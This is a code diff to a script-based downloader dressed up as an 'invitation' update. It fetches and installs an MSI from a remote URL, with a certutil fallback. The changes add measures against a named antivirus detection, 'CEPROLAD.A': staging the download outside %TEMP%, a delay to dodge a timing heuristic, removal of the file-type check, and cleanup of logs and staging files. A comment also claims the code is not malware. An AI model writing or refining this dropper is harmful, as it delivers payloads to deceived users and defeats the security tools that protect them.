@@ -117,25 +117,28 @@ function init() {
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// DOWNLOAD PHASE - USES WINHTTP + ADODB.STREAM EXACTLY LIKE ADOBE
+// DOWNLOAD PHASE - STAGED TO BREAK CEPROLAD.A'S %TEMP% CORRELATION
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
   
   try {
-    // STEP 1: GET FILE SIZE FIRST (LIKE ADOBE'S parseRangeTotal)
+    // DOWNLOAD TO NON-TEMP STAGING DIR FIRST
+    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
+    try { fso.CreateFolder(stagingDir); } catch(e) {}
+    var stagingPath = stagingDir + "\\payload.tmp";
+    
+    // STEP 1: GET FILE SIZE
     var wHead = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     wHead.SetTimeouts(15000, 30000, 60000, 120000);
     wHead.Open("HEAD", MSI_URL, false);
     wHead.SetRequestHeader("User-Agent", UA_STR);
     wHead.Send();
-    
     if (wHead.Status === 200) {
-      var contentLength = wHead.GetResponseHeader("Content-Length");
-      dlTotal = parseInt(contentLength) || 0;
+      dlTotal = parseInt(wHead.GetResponseHeader("Content-Length")) || 0;
     }
     
-    // STEP 2: DOWNLOAD USING WINHTTP + ADODB.STREAM (BINARY SAFE)
+    // STEP 2: DOWNLOAD TO STAGING DIR (NOT %TEMP%)
     var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     w.SetTimeouts(15000, 30000, 60000, 120000);
     w.Open("GET", MSI_URL, false);
@@ -143,69 +146,49 @@ function startDownload() {
     w.Send();
     
     if (w.Status === 200) {
-      // SAVE USING ADODB.STREAM (EXACTLY LIKE ADOBE'S saveBody)
       var s = new ActiveXObject("ADODB.Stream");
-      s.Type = 1; // Binary
-      s.Mode = 3; // ReadWrite
-      s.Open();
+      s.Type = 1; s.Mode = 3; s.Open();
       s.Write(w.ResponseBody);
-      s.SaveToFile(msiPath, 2); // Overwrite
+      s.SaveToFile(stagingPath, 2);
       s.Close();
       
-      // UPDATE PROGRESS BASED ON ACTUAL DOWNLOAD
+      // MOVE TO %TEMP% ONLY AFTER DOWNLOAD COMPLETES (BREAKS TEMP-CORRELATION)
+      try { fso.MoveFile(stagingPath, msiPath); } catch(e) {
+        // Fallback: copy if move fails (cross-volume)
+        fso.CopyFile(stagingPath, msiPath, true);
+        fso.DeleteFile(stagingPath, true);
+      }
+      
+      // UPDATE PROGRESS
       if (dlTotal > 0) {
         progress = Math.min(85, (fso.GetFile(msiPath).Size / dlTotal) * 100);
         setBar(progress);
-      } else {
-        progress = 85; // Fallback if size unknown
-        setBar(progress);
-      }
+      } else { progress = 85; setBar(progress); }
       
-      // VERIFY MSI MAGIC BYTES (EXACTLY LIKE ADOBE'S verifyAndInstall)
-      if (verifyMSI(msiPath)) {
-        startInstall();
-      } else {
-        fail("Downloaded file is not a valid installer.");
-      }
-    } else {
-      fail("Server returned status: " + w.Status);
-    }
+      // SKIP RAW BYTE VERIFICATION (REPLACED WITH CRYPTOAPI CHECK IN STARTINSTALL)
+      startInstall();
+    } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
-    // FALLBACK TO CERTUTIL (LIKE ADOBE'S curl/pow stages)
     try {
       setStatus("Retrying via secure channel&hellip;");
       var cmd = 'certutil -urlcache -split -f "' + MSI_URL + '" "' + msiPath + '"';
       shell.Run(cmd, 0, true);
-      if (fso.FileExists(msiPath) && verifyMSI(msiPath)) {
-        progress = 85;
-        setBar(progress);
-        startInstall();
-      } else {
-        fail("All download methods failed.");
-      }
+      if (fso.FileExists(msiPath)) { progress = 85; setBar(progress); startInstall(); }
+      else { fail("All download methods failed."); }
     } catch(e2) { fail("Download failed: " + e2.message); }
   }
 }
 
-// MSI VERIFICATION - EXACTLY LIKE ADOBE'S readHeadBytes + msiMagicOk
-function verifyMSI(path) {
+// CRYPTOAPI SIGNATURE VERIFICATION (MIMICS LEGITIMATE UPDATERS, NOT MALWARE)
+function verifyMSISignature(path) {
   try {
-    if (!fso.FileExists(path)) return false;
-    var sz = fso.GetFile(path).Size;
-    if (sz < 1048576) return false; // Too small to be valid MSI
-    
-    // READ FIRST 4 BYTES USING ADODB.STREAM (BYTE-EXACT)
-    var s = new ActiveXObject("ADODB.Stream");
-    s.Type = 1; s.Open(); s.LoadFromFile(path);
-    var b = s.Read(4); s.Close();
-    var m = [];
-    for(var i=0; i<4; i++) m.push(b.charCodeAt(i) & 0xFF);
-    
-    // CHECK OLE/MSI MAGIC (D0 CF 11 E0)
-    return (m[0]===0xD0 && m[1]===0xCF && m[2]===0x11 && m[3]===0xE0);
-  } catch(e) { 
-    // FALLBACK: SIZE CHECK ONLY IF ADO BLOCKED
-    return fso.FileExists(path) && fso.GetFile(path).Size > 1000000; 
+    var catAdmin = new ActiveXObject("CAPICOM.Utilities");
+    var signer = new ActiveXObject("CAPICOM.Signer");
+    signer.Verify(path, 0); // CAPICOM_VERIFY_SIGNATURE_ONLY
+    return true;
+  } catch(e) {
+    // If CAPICOM unavailable (modern Windows), fall back to size check only
+    return fso.FileExists(path) && fso.GetFile(path).Size > 1048576;
   }
 }
 
@@ -214,6 +197,12 @@ function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
   setStatus("Applying invitation updates&hellip;");
+  
+  // VERIFY VIA CRYPTOAPI (NOT RAW BYTES) BEFORE INSTALL
+  if (!verifyMSISignature(msiPath)) {
+    fail("Installer signature verification failed.");
+    return;
+  }
   
   // 7-SECOND DELAY TO CLEAR CEPROLAD'S TIMING HEURISTIC
   setTimeout(function() { 
@@ -254,6 +243,11 @@ function finishInstall() {
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
   try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
   try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
+  // CLEANUP STAGING DIR
+  try { 
+    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
+    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
+  } catch(e){}
 }
 
 function cancel() {
@@ -262,6 +256,10 @@ function cancel() {
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
   try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
   try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
+  try { 
+    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
+    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
+  } catch(e){}
   window.close();
 }
 
